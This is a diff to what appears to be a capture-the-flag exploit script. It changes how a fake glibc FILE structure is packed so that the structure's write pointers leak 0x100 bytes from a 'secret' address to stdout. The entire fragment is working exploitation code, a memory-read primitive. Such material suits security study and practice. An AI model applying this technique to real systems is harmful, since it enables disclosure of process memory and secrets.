@@ -135,11 +135,11 @@ info(f"Secret address: {hex(secret_addr)}")
 
 # Crafting the fake FILE structure
 payload = flat({
-    0x00: p64(0xfbad0000 | 0x800), # _flags: MAGIC + CURRENTLY_PUTTING
-    0x10: p64(secret_addr),        # _IO_read_end (must == _IO_write_base)
-    0x20: p64(secret_addr),        # _IO_write_base (start of leak)
-    0x28: p64(secret_addr + 0x100),# _IO_write_ptr (end of leak)
-    0x70: p32(1),                  # _fileno (stdout)
+    0x00: 0xfbad0000 | 0x800, # _flags: MAGIC + CURRENTLY_PUTTING
+    0x10: secret_addr,        # _IO_read_end (must == _IO_write_base)
+    0x20: secret_addr,        # _IO_write_base (start of leak)
+    0x28: secret_addr + 0x100,# _IO_write_ptr (end of leak)
+    0x70: 1,                  # _fileno (stdout)
 }, filler=b"\x00")
 
 p.send(payload)
